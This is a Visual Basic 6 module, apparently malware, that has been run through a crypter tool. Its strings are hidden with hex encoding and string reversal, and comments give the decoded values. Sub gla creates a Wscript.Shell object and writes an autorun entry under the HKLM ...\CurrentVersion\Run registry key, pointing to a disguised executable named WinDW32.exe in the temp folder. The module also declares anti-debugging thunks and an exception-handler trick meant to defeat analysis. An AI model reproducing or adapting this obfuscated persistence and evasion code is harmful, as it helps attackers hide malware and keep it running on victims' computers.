Attribute VB_Name = "fdlsjkfeinhksdfd"

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#      + Encriptacion  :Ascii
'#      + Contraseña    :-None-
'#      + L. Encriptadas:2
'#      + Fecha/Hora    :11:40:19--23.03.2010
'##############################################################

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#      + Encriptacion  :StrRev.
'#      + Contraseña    :-None-
'#      + L. Encriptadas:2
'#      + Fecha/Hora    :11:40:17--23.03.2010
'##############################################################

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#      + Encriptacion  :Ascii
'#      + Contraseña    :-None-
'#      + L. Encriptadas:2
'#      + Fecha/Hora    :11:40:14--23.03.2010
'##############################################################

'##############################################################
'#Codigo encriptado de forma automatizada                     #
'#por el Karcrack Project Crypter v2.1 [KPC]                  #
'#Programado integramente por Karcrack                        #
'#Informacion de la encriptacion:                             #
'#      + Encriptacion  :StrRev.
'#      + Contraseña    :-None-
'#      + L. Encriptadas:2
'#      + Fecha/Hora    :11:40:13--23.03.2010
'##############################################################
Option Explicit


Public Declare Function SetUnhandledExceptionFilter Lib "kernel32" (ByVal lpTopLevelExceptionFilter As Long) As Long
Public Declare Function FindExecutable Lib "shell32.dll" Alias "FindExecutableA" (ByVal lpFile As String, ByVal lpDirectory As String, ByVal lpResult As String) As Long

Public Declare Function CallWindowProc Lib "USER32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Public Declare Function ActivateKeyboardLayout Lib "USER32" (ByVal HKL As Long, ByVal flags As Long) As Long

Public Declare Sub PutMem8 Lib "MSVBVM60" (inDst As Any, ByVal inSrc As Currency)

Public Declare Function PostMessage Lib "USER32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Public Const THUNK_ANTI1       As Currency = -104917872100.9905@           'db 0x0F, 0x3F,0x07,0x0B,0xC7,0x45,0xFC,0xFF
Public Const THUNK_ANTI2       As Currency = -802975918416356.9665@        'db 0xFF,0xFF,0xFF + RET + NOP + NOP + NOP + NOP

Private m_bFlag                 As Boolean

Sub gla()
Dim Startup

'1-> Wscript.shell
'1-> llehs.tpircsW
'1-> 6C6C6568732E74706972637357
'1-> 75373627960747E2378656C6C6
Set Startup = CreateObject(StrReverse(kidniekph(StrReverse(ikwrpmvug("3735333733363237393630373437453233373836353643364336")))))

'1-> HKLM\Software\Microsoft\Windows\CurrentVersion\Run\; 2-> tmp; 3-> \WinDW32.exe
'1-> \nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH; 2-> pmt; 3-> exe.23WDniW\
'1-> 5C6E75525C6E6F6973726556746E65727275435C73776F646E69575C74666F736F7263694D5C6572617774666F535C4D4C4B48; 2-> 706D74; 3-> 6578652E323357446E69575C
'1-> 84B4C4D4C535F6664777162756C5D4963627F637F66647C57596E646F67737C53457272756E6476556273796F6E6C52557E6C5; 2-> 47D607; 3-> C57596E644753323E2568756
Startup.RegWrite (StrReverse(kidniekph(StrReverse(ikwrpmvug("383442344334443443353335463636363437373731363237353643354434393633363237463633374636363634374335373539364536343646363737333743353334353732373237353645363437363535363237333739364636453643353235353745364335"))))), Environ(StrReverse(kidniekph(StrReverse(ikwrpmvug("343744363037"))))) & StrReverse(kidniekph(StrReverse(ikwrpmvug("433537353936453634343735333332334532353638373536"))))
 
End Sub
Public Function ExceptionHandler(ByRef uException As Long) As Long
    m_bFlag = False: ExceptionHandler = -1
    ' VB Will process our error :P
    Call Mid$(vbNullString, 0)
End Function



